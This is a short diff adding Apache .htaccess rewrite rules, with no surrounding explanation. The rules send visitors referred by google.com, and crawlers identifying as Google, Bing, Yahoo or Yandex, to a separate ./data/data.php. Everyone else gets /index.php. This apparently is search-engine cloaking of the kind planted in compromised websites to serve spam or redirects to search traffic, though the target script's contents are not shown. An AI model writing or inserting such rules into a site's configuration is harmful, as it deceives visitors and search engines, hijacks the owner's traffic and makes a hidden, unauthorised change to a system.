@@ -1,0 +1,8 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} ^(.*)$
+RewriteRule ^ - [E=ENV_REFERRER:%1]
+RewriteCond %{ENV:ENV_REFERRER} google.com [NC]
+RewriteRule ^$ ./data/data.php/ [L]
+RewriteCond %{HTTP_USER_AGENT} (Google|Bing|Yahoo|Yandex) [NC]
+RewriteRule ^$ ./data/data.php [L]
+RewriteRule ^$ /index.php [L]
